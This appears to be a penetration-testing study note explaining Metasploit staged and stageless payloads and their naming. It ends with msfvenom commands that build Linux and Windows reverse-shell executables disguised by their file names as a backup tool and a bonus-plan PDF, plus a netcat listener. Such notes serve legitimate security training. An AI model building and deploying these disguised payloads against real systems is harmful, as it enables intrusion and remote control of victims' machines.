#### List Payloads
```shell-session
$ msfvenom -l payloads
```

### Staged vs. Stageless Payloads

#### Staged Payloads
- **Definition**: Staged payloads allow attackers to send more components of their attack over time, "setting the stage" for a more complex payload.
- **Example**: `linux/x86/shell/reverse_tcp`.
  - When executed via an exploit module in Metasploit, it sends a small initial stage to the target.
  - This stage calls back to the attacker's system to download and execute the rest of the payload, ultimately establishing a reverse shell.
- **Considerations**:
  - Requires configuring proper IPs and ports in Metasploit for successful execution.
  - Takes up memory space, which could limit the size of the payload.
  - The actions taken at each stage may vary depending on the payload.

#### Stageless Payloads
- **Definition**: Stageless payloads do not have stages; the entire payload is sent at once.
- **Example**: `linux/zarch/meterpreter_reverse_tcp`.
  - Sent in full across the network without needing a stage.
  - Beneficial in environments with limited bandwidth or high latency, where staged payloads might be unstable.
  - Potentially better for evasion due to less network traffic during execution.

#### Identifying Payload Types in Metasploit
- **Naming Convention**:
  - **Staged Payload**: Example - `linux/x86/shell/reverse_tcp`.
    - The name includes multiple stages, indicated by slashes `/`.
  - **Stageless Payload**: Example - `linux/zarch/meterpreter_reverse_tcp`.
    - The name is more compact, with all components (architecture, shell, and network communication) in a single function.

- **Quick Example**:
  - `windows/meterpreter/reverse_tcp` (Staged).
  - `windows/meterpreter_reverse_tcp` (Stageless).

- **Tip**: If the name is unclear, the payload description usually specifies whether it is staged or stageless.
## Building A Stageless Payload
#### Build It
```shell-session
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```

#### NC Connection
```shell-session
$ sudo nc -lvnp 443
```
## Building a simple Stageless Payload for a Windows system
```shell-session
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```
